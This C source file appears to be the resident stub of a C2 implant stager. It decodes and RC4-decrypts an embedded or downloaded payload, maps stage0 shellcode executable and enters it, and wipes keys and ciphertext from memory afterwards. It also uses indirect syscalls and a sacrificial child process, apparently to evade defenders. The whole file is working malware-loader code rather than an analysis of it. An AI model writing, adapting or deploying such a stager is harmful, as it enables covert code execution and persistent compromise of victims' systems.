#define _GNU_SOURCE
#include "util/debug.h"
#include "mask.h"
#ifdef STAGER_PAYLOAD_LOCAL
#include "local_payload.h"
#include "util/maps.h"
#else
#include "downloader_blob.h"
#endif
#include "util/rc4.h"
#include "stage_abi.h"
#include "state.h"
#include "util/strings.h"
#include "util/syscalls.h"
#include "util/utils.h"
#if SUPERVISE
#include "supervise.h"
#endif

/*
 * The stub is the only stage that stays resident for the whole agent
 * lifecycle. The payload provider may be the downloader (a separate mapping
 * that is zeroed and unmapped after the transfer) or a locally embedded C
 * agent PIC. Either way only the supervisor/state, the encrypted agent PIC and
 * its key remain in memory.
 */

#ifndef STAGER_PAYLOAD_LOCAL
typedef void (*downloader_fn)(struct stager_payload *);
#endif
typedef void (*stage1_entry)(void *base_addr, size_t total_size);

/*
 * malasada lays the agent out as [stage0 shellcode][msda header][payload].
 * Only the stage0 prefix needs to execute; the appended payload is data and
 * stays read-only. The prefix length is a build-time constant taken from the
 * pinned malasada stage0 binary (see MALASADA_STAGE0_LEN in the Makefile), so
 * the stub never has to guess where the code ends at runtime.
 */
#ifndef MALASADA_STAGE0_LEN
#define MALASADA_STAGE0_LEN 0
#endif

/*
 * Decrypt the payload ciphertext in place, then map only the malasada stage0
 * shellcode executable and enter it. The payload follows as read-only data;
 * stage0 later maps the agent ELF segments with their own per-segment
 * permissions. In supervision mode this runs in the forked child, so
 * copy-on-write confines every one of these permission changes to the
 * sacrificial process while the parent's mapping stays ciphertext RW.
 */
static void stage_run(void *arg) {
  struct stager_payload *res = (struct stager_payload *)arg;
  struct stager_state *st = get_stager_state();
  st->payload = res->data;
  st->payload_size = res->size;

  rc4_ctx rc4;
  rc4_init(&rc4, res->key, sizeof(res->key));
  memset(res->key, 0, sizeof(res->key));
  rc4_crypt(&rc4, (uint8_t *)res->data, res->size);

  /* With no known stage0 length, fall back to running the whole blob (the
   * previous behaviour); the constant is always set by the Makefile. */
  size_t rx_len = (MALASADA_STAGE0_LEN > 0)
                      ? PAGE_ALIGN_UP((size_t)MALASADA_STAGE0_LEN)
                      : PAGE_ALIGN_UP(res->size);
  if (rx_len > PAGE_ALIGN_UP(res->size))
    rx_len = PAGE_ALIGN_UP(res->size);
  if (mprotect(res->data, rx_len, PROT_READ | PROT_EXEC) != 0)
    exit(1);
  if (res->size > rx_len &&
      mprotect((uint8_t *)res->data + rx_len, res->size - rx_len,
               PROT_READ) != 0)
    exit(1);

  ((stage1_entry)res->data)(res->data, res->size);
}

#ifdef STAGER_PAYLOAD_LOCAL
static int read_all_local(int fd, char *buf, size_t cap) {
  size_t off = 0;
  while (off < cap) {
    long n = read(fd, buf + off, cap - off);
    if (n < 0) {
      if (n == -4) /* EINTR */
        continue;
      return -1;
    }
    if (n == 0)
      break;
    off += (size_t)n;
  }
  return (int)off;
}

/* Current protection of the mapping containing `addr`; 0 when unknown. */
static int mapping_prot(uintptr_t addr) {
  int fd = open("/proc/self/maps", O_RDONLY, 0);
  if (fd < 0)
    return 0;
  char text[16384];
  int n = read_all_local(fd, text, sizeof(text) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  text[n] = '\0';
  struct c2_map maps[64];
  size_t nmaps = c2_maps_parse(text, (size_t)n, maps,
                               sizeof(maps) / sizeof(maps[0]));
  for (size_t i = 0; i < nmaps; i++)
    if (addr >= maps[i].start && addr < maps[i].end)
      return maps[i].prot;
  return 0;
}

/* Zero a const byte range in the stager image, preserving the page protection
 * (which may include execute when .rodata shares a raw-PIC text page). */
static void wipe_const(void *ptr, size_t len) {
  uintptr_t addr = (uintptr_t)ptr;
  int prot = mapping_prot(addr);
  if (prot == 0)
    return;
  uintptr_t start = addr & ~(uintptr_t)(PAGE_SIZE - 1);
  uintptr_t end = (addr + len + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1);
  if (mprotect((void *)start, (size_t)(end - start),
               prot | PROT_WRITE) != 0)
    return;
  memset(ptr, 0, len);
  (void)mprotect((void *)start, (size_t)(end - start), prot);
}
#endif

/*
 * Acquire the encrypted agent PIC. The local path copies the embedded payload
 * into an anonymous RW mapping so decryption never writes to the stager image;
 * the downloader path maps and runs its separate blob, then unmaps it.
 */
static int acquire_payload(struct stager_payload *res) {
#ifdef STAGER_PAYLOAD_LOCAL
  size_t map_len = PAGE_ALIGN_UP(STAGER_LOCAL_PAYLOAD_LEN);
  void *stage = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (stage == MAP_FAILED)
    return -1;
  memcpy(stage, STAGER_LOCAL_PAYLOAD_BIN, STAGER_LOCAL_PAYLOAD_LEN);
  res->data = (char *)stage;
  res->size = STAGER_LOCAL_PAYLOAD_LEN;
  memcpy(res->key, STAGER_LOCAL_PAYLOAD_KEY, sizeof(res->key));
  /* The process that runs the payload never needs the embedded ciphertext
   * again. A supervising parent keeps its own copy for the next child. */
  wipe_const((void *)STAGER_LOCAL_PAYLOAD_KEY, sizeof(STAGER_LOCAL_PAYLOAD_KEY));
  wipe_const((void *)STAGER_LOCAL_PAYLOAD_BIN, STAGER_LOCAL_PAYLOAD_LEN);
  return 0;
#else
  size_t blob_len = downloader_bin_len;
  size_t map_len = PAGE_ALIGN_UP(blob_len);
  void *dl_exec = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dl_exec == MAP_FAILED)
    return -1;

  unsigned char *dst = (unsigned char *)dl_exec;
  for (size_t i = 0; i < blob_len; i++)
    dst[i] = downloader_bin[i] ^ downloader_key[i % sizeof(downloader_key)];
  if (mprotect(dl_exec, map_len, PROT_READ | PROT_EXEC) != 0) {
    munmap(dl_exec, map_len);
    return -1;
  }

  ((downloader_fn)dl_exec)(res);

  mprotect(dl_exec, map_len, PROT_READ | PROT_WRITE);
  memset(dl_exec, 0, map_len);
  munmap(dl_exec, map_len);
  return 0;
#endif
}

static void stub_main(void) __attribute__((used));
static void stub_main(void) {
  /* Per-process mutable state (GS base), the vDSO syscall gadget and the
   * mask entry point must exist before any payload provider runs. */
  stager_state_init();
  init_indirect_syscalls();
  stager_mask_publish();

  struct stager_payload res = {0};
  if (acquire_payload(&res) != 0 || res.data == NULL || res.size == 0)
    exit(1);

#if SUPERVISE
  debug_print("Stage0: supervising Stage1 in a sacrificial process\n");
  supervise_run(stage_run, &res);
#else
  stage_run(&res);
#endif
  exit(0);
}

/* `main` is kept for the shared-object/executable formats, whose loaders enter
 * through it instead of jumping to _start. */
__attribute__((visibility("default"))) int main(void) {
  stub_main();
  return 0;
}

/* The raw shellcode enters at offset 0, so it carries its own _start. The
 * hosted SO/EXE formats use the C runtime startup instead (glibc _start ->
 * main), where a second _start would clash with crt1.o. */
#ifndef STAGER_LINKED_LIBC
__asm__(".section .init,\"ax\",@progbits\n"
        ".global _start\n"
        "_start:\n"
        "xor %rbp, %rbp\n"
        "and $0xfffffffffffffff0, %rsp\n"
        "call stub_main\n"
        "mov $60, %rax\n"
        "xor %rdi, %rdi\n"
        "syscall\n");
#endif
